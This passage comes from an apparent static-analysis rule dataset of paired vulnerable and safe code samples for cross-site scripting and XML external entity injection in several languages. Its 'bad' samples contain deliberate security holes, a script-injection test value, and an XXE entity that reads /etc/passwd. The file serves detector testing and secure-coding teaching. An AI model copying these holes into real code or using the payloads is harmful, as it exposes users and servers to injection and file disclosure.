    "code": "package main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n)\n\nfunc indexPage(w http.ResponseWriter, r *http.Request) {\n    const template = `\n    <html>\n    <body>\n      <h1>Random Movie Quotes</h1>\n      <h2>%s</h2>\n      <h4>~%s, %s</h4>\n    </body>\n    </html>`\n\n    quote := getMovieQuote()\n    quoteText := quote[\"quote\"]\n    movie := quote[\"movie\"]\n    year := quote[\"year\"]\n\n    w.WriteHeader(http.StatusAccepted)\n    // ruleid: no-direct-write-to-responsewriter\n    w.Write([]byte(fmt.Sprintf(template, quoteText, movie, year)))\n}\n\nfunc errorPage(w http.ResponseWriter, r *http.Request) {\n    params := r.URL.Query()\n    urls, ok := params[\"url\"]\n    url := urls[0]\n\n    const template = `\n    <html>\n    <body>\n      <h1>error; page not found. <a href=\"%s\">go back</a></h1>\n    </body>\n    </html>`\n\n    w.WriteHeader(http.StatusAccepted)\n    // ruleid: no-direct-write-to-responsewriter\n    w.Write([]byte(fmt.Sprintf(template, url)))\n}",
    "language": "go",
    "description": "writing formatted strings to ResponseWriter"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Scripting (XSS)",
    "type": "good",
    "code": "package main\n\nimport (\n    \"net/http\"\n)\n\nfunc healthCheck(w http.ResponseWriter, r *http.Request) {\n    // ok: no-direct-write-to-responsewriter\n    w.Write([]byte(\"alive\"))\n}",
    "language": "go",
    "description": "static content or use html/template"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Scripting (XSS)",
    "type": "bad",
    "code": "package main\n\nimport \"fmt\"\nimport \"html/template\"\n\nfunc main() {\n    var g = \"foo\"\n\n    // ruleid:go-insecure-templates\n    const a template.HTML = fmt.Sprintf(\"<a href=%q>link</a>\")\n    // ruleid:go-insecure-templates\n    var b template.CSS = \"a { text-decoration: underline; } \"\n    // ruleid:go-insecure-templates\n    var c template.HTMLAttr =  fmt.Sprintf(\"herf=%q\")\n    // ruleid:go-insecure-templates\n    const d template.JS = \"{foo: 'bar'}\"\n    // ruleid:go-insecure-templates\n    var e template.JSStr = \"setTimeout('alert()')\";\n    // ruleid:go-insecure-templates\n    var f template.Srcset = g;\n}",
    "language": "go",
    "description": "using insecure template types"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Scripting (XSS)",
    "type": "good",
    "code": "package main\n\nimport \"html/template\"\n\nfunc main() {\n    // ok:go-insecure-templates\n    tmpl, err := template.New(\"test\").ParseFiles(\"file.txt\")\n    myTpl.Execute(w, data);\n}",
    "language": "go",
    "description": "use safe template parsing"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Scripting (XSS)",
    "type": "bad",
    "code": "require \"abstract_unit\"\n\nclass OutputSafetyHelperTest < ActionView::TestCase\n  tests ActionView::Helpers::OutputSafetyHelper\n\n  def setup\n    @string = \"hello\"\n  end\n\n  test \"raw returns the safe string\" do\n    # ruleid: avoid-raw\n    result = raw(@string)\n    assert_equal @string, result\n  end\n\n  test \"raw handles nil values correctly\" do\n    # ruleid: avoid-raw\n    assert_equal \"\", raw(nil)\n  end\n\n  test \"safe_join should html_escape any items\" do\n    # ruleid: avoid-raw\n    joined = safe_join([raw(\"<p>foo</p>\"), \"<p>bar</p>\"], \"<br />\")\n  end\nend",
    "language": "ruby",
    "description": "Incorrect (using raw() to bypass escaping) example for Prevent Cross-Site Scripting (XSS)"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Scripting (XSS)",
    "type": "bad",
    "code": "# ruleid: avoid-html-safe\n\"foo\".html_safe\n\n# ruleid: avoid-html-safe\n\"<div>foo</div>\".html_safe + \"<bar>\"\n\n# ruleid: avoid-html-safe\nhtml = \"<div>\".html_safe\n\n# ruleid: avoid-html-safe\n\"<div>\".html_safe.tap",
    "language": "ruby",
    "description": "Incorrect (using html_safe() to bypass escaping) example for Prevent Cross-Site Scripting (XSS)"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Scripting (XSS)",
    "type": "good",
    "code": "# ok: avoid-html-safe\n\"foo\".length\n\n# ok: avoid-html-safe\nhtml = \"<div>\"",
    "language": "ruby",
    "description": "no html_safe on user input"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Scripting (XSS)",
    "type": "bad",
    "code": "package servlets;\n\nimport java.io.PrintWriter;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class Cls extends HttpServlet\n{\n    protected void danger(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        String input1 = req.getParameter(\"input1\");\n        // ruleid:servletresponse-writer-xss\n        resp.getWriter().write(input1);\n    }\n\n    protected void danger2(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        String input1 = req.getParameter(\"input1\");\n        // ruleid:servletresponse-writer-xss\n        PrintWriter writer = resp.getWriter();\n        writer.write(input1);\n    }\n}",
    "language": "java",
    "description": "writing request parameters directly"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Scripting (XSS)",
    "type": "good",
    "code": "package servlets;\n\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class Cls extends HttpServlet\n{\n    protected void ok(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        String input1 = req.getParameter(\"input1\");\n        // ok:servletresponse-writer-xss\n        resp.getWriter().write(Encode.forHtml(input1));\n    }\n}",
    "language": "java",
    "description": "encode output"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Scripting (XSS)",
    "type": "bad",
    "code": "<?php\n\n// example key-value: name=%3Cscript%3Econfirm%28%29%3C%2Fscript%3E\nfunction dangerousEchoUsage() {\n    $name = $_REQUEST['name'];\n    // ruleid: echoed-request\n    echo \"Hello : $name\";\n    // ruleid: echoed-request\n    echo \"Hello : \" . $name;\n}\n\nfunction doSmth() {\n    $name = $_REQUEST['name'];\n    // ruleid: echoed-request\n    echo \"Hello :\".$name;\n}\n\nfunction doSmth2() {\n    // ruleid: echoed-request\n    echo \"Hello \".$_POST['name'].\" !\";\n}\n\nfunction doSmth3() {\n    $name = $_GET['name'];\n    if (str_contains($name, 'foobar')) {\n        // ruleid: echoed-request\n        echo \"Hello :\".$name;\n    }\n}",
    "language": "php",
    "description": "echoing user input"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Scripting (XSS)",
    "type": "good",
    "code": "<?php\n\nfunction safeEchoUsage() {\n    $name = $_REQUEST['name'];\n    // ok: echoed-request\n    echo \"Hello : \" . htmlentities($name);\n}\n\nfunction doOK1() {\n    // ok: echoed-request\n    echo \"Hello \".htmlentities($_POST['name']).\" !\";\n}\n\nfunction doOK2() {\n    $input = $_GET['name'];\n    // ok: echoed-request\n    echo \"Hello \".htmlspecialchars($input).\" !\";\n}\n\nfunction doOK3() {\n    $safevar = \"Hello \".htmlentities(trim($_GET['name']));\n    // ok: echoed-request\n    echo $safevar;\n}\n\nfunction doOK4() {\n    // ok: echoed-request - Laravel escape function\n    echo \"Hello \".e($_POST['name']).\" !\";\n}\n\nfunction doOK5() {\n    // ok: echoed-request - WordPress escape function\n    $safevar = esc_attr($_GET['name']);\n    echo \"Hello $safevar !\";\n}",
    "language": "php",
    "description": "use htmlentities or htmlspecialchars"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Scripting (XSS)",
    "type": "bad",
    "code": "package controllers\n\nimport play.api._\nimport play.api.mvc.{Action, Controller}\nimport play.twirl.api.Html;\n\nclass XssController extends Controller {\n\n  def vulnerable1(value: String) = Action { implicit request: Request[AnyContent] =>\n    // ruleid: tainted-html-response\n    Ok(s\"Hello $value !\").as(\"text/html\")\n  }\n\n  def vulnerable2(value: String) = Action.async { implicit request: Request[AnyContent] =>\n    // ruleid: tainted-html-response\n    Ok(\"Hello \" + value + \" !\").as(\"tExT/HtML\")\n  }\n\n  def vulnerable6(value:String) = Action { implicit request: Request[AnyContent] =>\n    // ruleid: tainted-html-response\n    Ok(views.html.xssHtml.render(Html.apply(\"Hello \"+value+\" !\")))\n  }\n}",
    "language": "scala",
    "description": "user input in HTML response"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Scripting (XSS)",
    "type": "good",
    "code": "package controllers\n\nimport play.api._\nimport play.api.mvc.{Action, Controller}\nimport play.twirl.api.Html;\n\nclass XssController extends Controller {\n\n  def safeJson(value: String) = Action.async { implicit request: Request[AnyContent] =>\n    // ok: tainted-html-response\n    Ok(\"Hello \" + value + \" !\").as(\"text/json\")\n  }\n\n  def safeTemplate(value:String) = Action {\n    // ok: tainted-html-response\n    Ok(views.html.template.render(value))\n  }\n\n  def variousSafe(value: String) = Action { implicit request: Request[AnyContent] =>\n    // ok: tainted-html-response\n    Ok(\"Hello \"+value+\" !\")\n    // ok: tainted-html-response\n    Ok(s\"Hello $value !\").as(\"text/json\")\n    // ok: tainted-html-response\n    Ok(\"<b>Hello !</b>\").as(\"text/html\")\n    // ok: tainted-html-response\n    Ok(views.html.xssHtml.render(Html.apply(\"<b>Hello !</b>\")))\n\n    val escapedValue = org.apache.commons.lang3.StringEscapeUtils.escapeHtml4(value)\n    // ok: tainted-html-response\n    Ok(\"Hello \" + escapedValue + \" !\").as(\"text/html\")\n\n    val owaspEscapedValue = org.owasp.encoder.Encode.forHtml(value)\n    // ok: tainted-html-response\n    Ok(\"Hello \" + owaspEscapedValue + \" !\").as(\"text/html\")\n  }\n}",
    "language": "scala",
    "description": "use templates or escape"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "bad",
    "code": "class BadXMLInputFactory {\n    public BadXMLInputFactory() {\n        final XMLInputFactory xmlInputFactory = XMLInputFactory.newFactory();\n        // ruleid:xmlinputfactory-external-entities-enabled\n        xmlInputFactory.setProperty(\"javax.xml.stream.isSupportingExternalEntities\", true);\n    }\n}\n\nclass BadXMLInputFactory1 {\n    public BadXMLInputFactory1() {\n        final XMLInputFactory xmlInputFactory = XMLInputFactory.newFactory();\n        // ruleid:xmlinputfactory-external-entities-enabled\n        xmlInputFactory.setProperty(XMLInputFactory.SUPPORT_DTD, true);\n    }\n}",
    "language": "java",
    "description": "vulnerable to XXE"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "good",
    "code": "class GoodXMLInputFactory {\n    public GoodXMLInputFactory() {\n        final XMLInputFactory xmlInputFactory = XMLInputFactory.newFactory();\n        xmlInputFactory.setProperty(XMLInputFactory.SUPPORT_DTD, false);\n        // ok:xmlinputfactory-external-entities-enabled\n        xmlInputFactory.setProperty(\"javax.xml.stream.isSupportingExternalEntities\", false);\n    }\n}",
    "language": "java",
    "description": "XXE disabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "bad",
    "code": "class MaybeBadXMLInputFactory {\n    public void foobar() {\n        // ruleid:xmlinputfactory-possible-xxe\n        final XMLInputFactory xmlInputFactory = XMLInputFactory.newFactory();\n    }\n}\n\nclass BadXMLInputFactory1 {\n    public BadXMLInputFactory1() {\n        // ruleid:xmlinputfactory-possible-xxe\n        final XMLInputFactory xmlInputFactory = XMLInputFactory.newFactory();\n        xmlInputFactory.setProperty(\"javax.xml.stream.isSupportingExternalEntities\", true);\n    }\n}",
    "language": "java",
    "description": "vulnerable to XXE"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "good",
    "code": "class GoodXMLInputFactory {\n    public void blah() {\n        final XMLInputFactory xmlInputFactory = XMLInputFactory.newFactory();\n        xmlInputFactory.setProperty(XMLInputFactory.SUPPORT_DTD, false);\n        // ok\n        xmlInputFactory.setProperty(\"javax.xml.stream.isSupportingExternalEntities\", false);\n    }\n}\n\nclass GoodConstXMLInputFactory {\n    public GoodConstXMLInputFactory() {\n        final XMLInputFactory xmlInputFactory = XMLInputFactory.newFactory();\n        xmlInputFactory.setProperty(XMLInputFactory.SUPPORT_DTD, false);\n        // ok\n        xmlInputFactory.setProperty(IS_SUPPORTING_EXTERNAL_ENTITIES, false);\n    }\n}",
    "language": "java",
    "description": "XXE disabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "bad",
    "code": "class BadDocumentBuilderFactory{\n    public void BadDocumentBuilderFactory() throws  ParserConfigurationException {\n        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n        //ruleid:documentbuilderfactory-disallow-doctype-decl-missing\n        dbf.newDocumentBuilder();\n    }\n\n    public void BadDocumentBuilderFactory2() throws  ParserConfigurationException {\n        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n        dbf.setFeature(\"somethingElse\", true);\n        //ruleid:documentbuilderfactory-disallow-doctype-decl-missing\n        dbf.newDocumentBuilder();\n    }\n}",
    "language": "java",
    "description": "vulnerable to XXE"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "good",
    "code": "class GoodDocumentBuilderFactory {\n    public void GoodDocumentBuilderFactory() throws  ParserConfigurationException {\n        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n        dbf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\n        //ok:documentbuilderfactory-disallow-doctype-decl-missing\n        dbf.newDocumentBuilder();\n    }\n\n    public void GoodDocumentBuilderFactory2() throws  ParserConfigurationException {\n        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n        dbf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);\n        dbf.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);\n        //ok:documentbuilderfactory-disallow-doctype-decl-missing\n        dbf.newDocumentBuilder();\n    }\n}",
    "language": "java",
    "description": "XXE disabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "bad",
    "code": "class BadDocumentBuilderFactory{\n    public void BadXMLInputFactory() throws  ParserConfigurationException {\n        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n        //ruleid:documentbuilderfactory-disallow-doctype-decl-false\n        dbf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", false);\n    }\n}",
    "language": "java",
    "description": "vulnerable to XXE"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "good",
    "code": "class GoodDocumentBuilderFactory {\n    public void GoodXMLInputFactory() throws  ParserConfigurationException {\n        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n        //ok:documentbuilderfactory-disallow-doctype-decl-false\n        dbf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\n    }\n}",
    "language": "java",
    "description": "XXE disabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "bad",
    "code": "class BadDocumentBuilderFactory{\n    public void BadXMLInputFactory() throws  ParserConfigurationException {\n        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n        //ruleid:documentbuilderfactory-external-general-entities-true\n        dbf.setFeature(\"http://xml.org/sax/features/external-general-entities\" , true);\n    }\n}\n\nclass BadSAXParserFactory{\n    public void BadSAXParserFactory() throws  ParserConfigurationException {\n        SAXParserFactory spf = SAXParserFactory.newInstance();\n        //ruleid:documentbuilderfactory-external-general-entities-true\n        spf.setFeature(\"http://xml.org/sax/features/external-general-entities\" , true);\n    }\n}",
    "language": "java",
    "description": "vulnerable to XXE"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "good",
    "code": "class GoodDocumentBuilderFactory {\n    public void GoodXMLInputFactory() throws  ParserConfigurationException {\n        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n        //ok:documentbuilderfactory-external-general-entities-true\n        dbf.setFeature(\"http://xml.org/sax/features/external-general-entities\" , false);\n    }\n}",
    "language": "java",
    "description": "XXE disabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "bad",
    "code": "class BadDocumentBuilderFactory{\n    public void BadXMLInputFactory() throws  ParserConfigurationException {\n        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n        //ruleid:documentbuilderfactory-external-parameter-entities-true\n        dbf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\" , true);\n    }\n}\n\nclass BadSAXParserFactory{\n    public void BadSAXParserFactory() throws  ParserConfigurationException {\n        SAXParserFactory spf = SAXParserFactory.newInstance();\n        //ruleid:documentbuilderfactory-external-parameter-entities-true\n        spf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\" , true);\n    }\n}",
    "language": "java",
    "description": "vulnerable to XXE"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "good",
    "code": "class GoodDocumentBuilderFactory {\n    public void GoodXMLInputFactory() throws  ParserConfigurationException {\n        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n        //ok:documentbuilderfactory-external-parameter-entities-true\n        dbf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\" , false);\n    }\n}",
    "language": "java",
    "description": "XXE disabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "bad",
    "code": "class BadSAXParserFactory{\n    public void BadSAXParserFactory() throws  ParserConfigurationException {\n        SAXParserFactory spf = SAXParserFactory.newInstance();\n        //ruleid:saxparserfactory-disallow-doctype-decl-missing\n        spf.newSAXParser();\n    }\n\n    public void BadSAXParserFactory2() throws  ParserConfigurationException {\n        SAXParserFactory spf = SAXParserFactory.newInstance();\n        spf.setFeature(\"somethingElse\", true);\n        //ruleid:saxparserfactory-disallow-doctype-decl-missing\n        spf.newSAXParser();\n    }\n}",
    "language": "java",
    "description": "vulnerable to XXE"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "good",
    "code": "class GoodSAXParserFactory {\n    public void GoodSAXParserFactory() throws  ParserConfigurationException {\n        SAXParserFactory spf = SAXParserFactory.newInstance();\n        spf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\n        //ok:saxparserfactory-disallow-doctype-decl-missing\n        spf.newSAXParser();\n    }\n\n    public void GoodSAXParserFactory2() throws  ParserConfigurationException {\n        SAXParserFactory spf = SAXParserFactory.newInstance();\n        spf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);\n        spf.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);\n        //ok:saxparserfactory-disallow-doctype-decl-missing\n        spf.newSAXParser();\n    }\n}",
    "language": "java",
    "description": "XXE disabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "bad",
    "code": "class TransformerFactory {\n    public void BadTransformerFactory() {\n        TransformerFactory factory = TransformerFactory.newInstance();\n        factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, \"\");\n        //ruleid:transformerfactory-dtds-not-disabled\n        factory.newTransformer(new StreamSource(xyz));\n    }\n\n    public void BadTransformerFactory2() {\n        TransformerFactory factory = TransformerFactory.newInstance();\n        factory.setAttribute(\"http://javax.xml.XMLConstants/property/accessExternalDTD\", \"\");\n        //ruleid:transformerfactory-dtds-not-disabled\n        factory.newTransformer(new StreamSource(xyz));\n    }\n}",
    "language": "java",
    "description": "vulnerable to XXE"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "good",
    "code": "class TransformerFactory {\n    public void GoodTransformerFactory() {\n        TransformerFactory factory = TransformerFactory.newInstance();\n        //ok:transformerfactory-dtds-not-disabled\n        factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, \"\");\n        factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, \"\");\n        factory.newTransformer(new StreamSource(xyz));\n    }\n\n    public void GoodTransformerFactory3() {\n        TransformerFactory factory = TransformerFactory.newInstance();\n        //ok:transformerfactory-dtds-not-disabled\n        factory.setAttribute(\"http://javax.xml.XMLConstants/property/accessExternalStylesheet\", \"\");\n        factory.setAttribute(\"http://javax.xml.XMLConstants/property/accessExternalDTD\", \"\");\n        factory.newTransformer(new StreamSource(xyz));\n    }\n}",
    "language": "java",
    "description": "XXE disabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "bad",
    "code": "public class XmlDecodeUtil {\n    // ruleid: xml-decoder\n    public static Object handleXml(InputStream in) {\n        XMLDecoder d = new XMLDecoder(in);\n        try {\n            Object result = d.readObject(); //Deserialization happen here\n            return result;\n        }\n        finally {\n            d.close();\n        }\n    }\n}",
    "language": "java",
    "description": "vulnerable to XXE"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "good",
    "code": "public class XmlDecodeUtil {\n    // ok: xml-decoder\n    public static Object handleXml1() {\n        XMLDecoder d = new XMLDecoder(\"<safe>XML</safe>\");\n        try {\n            Object result = d.readObject();\n            return result;\n        }\n        finally {\n            d.close();\n        }\n    }\n\n    // ok: xml-decoder\n    public static Object handleXml2() {\n        String strXml = \"<safe>XML</safe>\";\n        XMLDecoder d = new XMLDecoder(strXml);\n        try {\n            Object result = d.readObject();\n            return result;\n        }\n        finally {\n            d.close();\n        }\n    }\n}",
    "language": "java",
    "description": "safe usage"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "bad",
    "code": "function test1(body) {\n    // ruleid: xml2json-xxe\n    const xml2json = require('xml2json')\n    const result = xml2json.toJson(body, { object: true, arrayNotation: true })\n    return result\n}",
    "language": "javascript",
    "description": "vulnerable to XXE"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "good",
    "code": "function okTest1() {\n    // ok: xml2json-xxe\n    const xml2json = require('xml2json')\n    const result = xml2json.toJson('<xml></xml>', { object: true, arrayNotation: true })\n    return result\n}\n\nfunction okTest1() {\n    // ok: xml2json-xxe\n    const xml2json = require('xml2json')\n    let body = '<xml></xml>'\n    const result = xml2json.toJson(body, { object: true, arrayNotation: true })\n    return result\n}",
    "language": "javascript",
    "description": "safe usage"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "bad",
    "code": "function test1(input) {\n    // ruleid: expat-xxe\n    var expat = require('node-expat')\n    var parser = new expat.Parser('UTF-8')\n    parser.parse(input)\n}\n\nfunction test2(input) {\n    // ruleid: expat-xxe\n    const {Parser} = require('node-expat')\n    const parser = new Parser('UTF-8')\n    parser.write(input)\n}",
    "language": "javascript",
    "description": "vulnerable to XXE"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "good",
    "code": "function okTest3() {\n    // ok: expat-xxe\n    var expat = require('node-expat')\n    var parser = new expat.Parser('UTF-8')\n    parser.parse(\"safe input\")\n}\n\nfunction okTest4() {\n    // ok: expat-xxe\n    const {Parser} = require('node-expat')\n    const parser = new Parser('UTF-8')\n    const x = \"safe input\"\n    parser.write(x)\n}",
    "language": "javascript",
    "description": "safe usage"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "bad",
    "code": "function test1() {\n    // ruleid: sax-xxe\n    var sax = require(\"sax\"),\n    strict = false,\n    parser = sax.parser(strict);\n\n    parser.onattribute = function (attr) {\n        doSmth(attr)\n    };\n\n    parser.ondoctype = function(dt) {\n        processDocType(dt)\n    }\n\n    const xml = `<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n    <!DOCTYPE foo [\n    <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n    <username>&xxe;</username>`;\n\n    parser.write(xml).close();\n}\n\nfunction test2() {\n    // ruleid: sax-xxe\n    var saxStream = require(\"sax\").createStream(strict, options)\n\n    saxStream.on(\"opentag\", function (node) {\n        // same object as above\n    })\n\n    saxStream.on(\"doctype\", function (node) {\n        processType(node)\n    })\n\n    fs.createReadStream(\"file.xml\")\n        .pipe(saxStream)\n        .pipe(fs.createWriteStream(\"file-copy.xml\"))\n}",
    "language": "javascript",
    "description": "vulnerable to XXE"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "good",
    "code": "function okTest1() {\n    // ok: sax-xxe\n    var saxStream = require(\"sax\").createStream(strict, options)\n\n    saxStream.on(\"ontext\", function (node) {\n        // same object as above\n    })\n\n    fs.createReadStream(\"file.xml\").pipe(saxStream).pipe(fs.createWriteStream(\"file-copy.xml\"))\n}",
    "language": "javascript",
    "description": "safe usage"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "bad",
    "code": "function test1() {\n    const express = require('express')\n    const xml2json = require('xml2json')\n    const app = express()\n    const port = 3000\n\n    app.get('/', (req, res) => {\n        const xml = req.query.xml\n        // ruleid: express-xml2json-xxe\n        const content = xml2json.toJson(xml, {coerce: true, object: true});\n        res.send(content)\n    })\n\n    app.listen(port, () => console.log(`Example app listening at http://localhost:${port}`))\n}\n\nfunction test2() {\n    const express = require('express')\n    const xml2json = require('xml2json')\n    const app = express()\n    const port = 3000\n\n    app.get('/', (req, res) => {\n        // ruleid: express-xml2json-xxe\n        const content = xml2json.toJson(req.body, {coerce: true, object: true});\n        res.send(content)\n    })\n\n    app.listen(port, () => console.log(`Example app listening at http://localhost:${port}`))\n}",
    "language": "javascript",
    "description": "vulnerable to XXE"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "good",
    "code": "function okTest() {\n    const express = require('express')\n    const xml2json = require('xml2json')\n    const app = express()\n    const port = 3000\n\n    app.get('/', (req, res) => {\n        // ok: express-xml2json-xxe\n        const content = expat.toJson(someVerifiedData(), {coerce: true, object: true});\n        res.send(content)\n    })\n\n    app.listen(port, () => console.log(`Example app listening at http://localhost:${port}`))\n}",
    "language": "javascript",
    "description": "safe usage"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "bad",
    "code": "const express = require('express')\nconst app = express()\nconst port = 3000\nconst expat = require('node-expat');\n\napp.get('/test', async (req, res) => {\n    var parser = new expat.Parser('UTF-8')\n    // ruleid: express-expat-xxe\n    parser.parse(req.body)\n    res.send('Hello World!')\n})\n\napp.get('/test1', async (req, res) => {\n    var parser = new expat.Parser('UTF-8')\n    // ruleid: express-expat-xxe\n    parser.write(req.query.value)\n    res.send('Hello World!')\n})\n\napp.get('/test2', async (req, res) => {\n    var parser = new expat.Parser('UTF-8')\n    var data = req.body.foo\n    // ruleid: express-expat-xxe\n    parser.write(data)\n    res.send('Hello World!')\n})",
    "language": "javascript",
    "description": "vulnerable to XXE"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "good",
    "code": "app.get('/okTest1', async (req, res) => {\n    var parser = new expat.Parser('UTF-8')\n    // ok: express-expat-xxe\n    parser.write('<xml>hardcoded</xml>')\n    res.send('Hello World!')\n})\n\napp.get('/okTest2', async (req, res) => {\n    var parser = new expat.Parser('UTF-8')\n    var data = foo()\n    // ok: express-expat-xxe\n    parser.write(data)\n    res.send('Hello World!')\n})",
    "language": "javascript",
    "description": "safe usage"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "bad",
    "code": "var libxmljs = require(\"libxmljs\");\nvar libxmljs2 = require(\"libxmljs2\");\n\nmodule.exports.foo =  function(req, res) {\n    // ruleid: express-libxml-noent\n    libxmljs.parseXmlString(req.files.products.data.toString('utf8'), {noent:true,noblanks:true})\n    // ruleid: express-libxml-noent\n    libxmljs.parseXml(req.query.products, {noent:true,noblanks:true})\n    // ruleid: express-libxml-noent\n    libxmljs2.parseXmlString(req.body, {noent:true,noblanks:true})\n    // ruleid: express-libxml-noent\n    libxmljs2.parseXml(req.body, {noent:true,noblanks:true})\n}",
    "language": "javascript",
    "description": "vulnerable to XXE"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "good",
    "code": "module.exports.foo =  function(req, res) {\n    // ok: express-libxml-noent\n    libxmljs.parseXml(req.files.products.data.toString('utf8'), {noent:false,noblanks:true})\n    // ok: express-libxml-noent\n    libxmljs2.parseXml(req.body, {noent:false,noblanks:true})\n}",
    "language": "javascript",
    "description": "XXE disabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "bad",
    "code": "function handleXmlUpload ({ file }: Request, res: Response, next: NextFunction) {\n  if (utils.endsWith(file?.originalname.toLowerCase(), '.xml')) {\n    if (file?.buffer && !utils.disableOnContainerEnv()) {\n      const data = file.buffer.toString()\n      try {\n        const sandbox = { libxml, data }\n        vm.createContext(sandbox)\n\n        // ruleid: express-libxml-vm-noent\n        const xmlDoc = vm.runInContext('libxml.parseXml(data, { noblanks: true, noent: true, nocdata: true })', sandbox, { timeout: 2000 })\n\n        // ruleid: express-libxml-vm-noent\n        libxml.parseXml(data, { noblanks: true, noent: true, nocdata: true })\n\n        const xml_opts = { noblanks: true, noent: true, nocdata: true }\n        // ruleid: express-libxml-vm-noent\n        libxml.parseXml(data, xml_opts)\n      }\n    }\n  }\n}",
    "language": "javascript",
    "description": "vulnerable to XXE"
  },
  {
    "ruleId": "",
